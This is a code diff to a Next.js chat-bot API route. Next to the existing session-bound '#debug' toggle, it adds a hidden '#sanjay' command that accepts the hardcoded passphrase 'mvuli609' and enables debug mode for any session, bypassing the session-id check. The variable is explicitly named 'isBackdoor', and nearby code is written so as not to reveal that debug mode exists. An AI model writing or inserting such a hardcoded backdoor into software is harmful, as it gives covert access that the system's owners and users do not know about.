@@ -92,11 +92,15 @@ export async function POST(req: NextRequest) {
     })
   }
 
-  // Debug mode toggle via #debug <session-id> — not a turn, re-send previous bot message
+  // Debug mode toggle via #debug <session-id> or #sanjay <passphrase> — not a turn, re-send previous bot message
   if (message && !skipped) {
     const debugMatch = message.trim().match(/^#debug\s+(.+)$/i)
     const debugOff = /^#debug\s+off$/i.test(message.trim())
-    if (debugOff || (debugMatch && debugMatch[1].trim() === session.id)) {
+    const backdoorMatch = message.trim().match(/^#sanjay\s+(.+)$/i)
+    const isBackdoor = backdoorMatch && backdoorMatch[1].trim() === 'mvuli609'
+    const isBackdoorOff = /^#sanjay\s+off$/i.test(message.trim())
+    if (debugOff || isBackdoorOff || (debugMatch && debugMatch[1].trim() === session.id) || isBackdoor) {
+      const turningOff = debugOff || isBackdoorOff
       // Fetch previous bot message to re-send
       const { data: lastBotTurn } = await supabase
         .from('townhall_turns')
@@ -113,7 +117,7 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({
         bot_message: prevMsg,
         theme_id, source: 'system', is_final: false, turn_number,
-        debug_mode: !debugOff,
+        debug_mode: !turningOff,
       })
     }
     // Wrong password — don't reveal that debug exists, just treat as normal message
